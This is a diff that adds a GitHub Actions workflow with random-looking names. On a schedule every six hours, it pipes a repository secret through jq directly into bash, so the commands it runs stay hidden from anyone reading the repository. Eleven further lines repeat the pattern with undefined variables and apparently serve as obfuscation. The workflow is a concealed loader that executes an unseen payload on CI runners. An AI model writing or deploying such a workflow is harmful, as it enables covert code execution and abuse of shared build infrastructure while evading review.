@@ -1,0 +1,28 @@
+name: huhuangzhang6574
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: huhuangzhang6574
+        env:
+          z9569: ${{ secrets.z9569 }}
+        run: |
+          echo $z9569 | jq -r .ou45 | /bin/bash
+          echo $l589 | jq -r .cfa3 | /bin/bash
+          echo $uovqh35992 | jq -r .zsuv63427 | /bin/bash
+          echo $pjynh4345 | jq -r .asrt3862 | /bin/bash
+          echo $kurxw62603 | jq -r .gqtos20904 | /bin/bash
+          echo $qouz10 | jq -r .tnzm34 | /bin/bash
+          echo $vdrz034 | jq -r .jyzr4851 | /bin/bash
+          echo $htjbh35 | jq -r .ekv1 | /bin/bash
+          echo $lyd5966 | jq -r .tk36158 | /bin/bash
+          echo $ompo2927 | jq -r .gdrlr31 | /bin/bash
+          echo $vm08 | jq -r .rveg438 | /bin/bash
+          echo $k56247 | jq -r .swy80 | /bin/bash
+
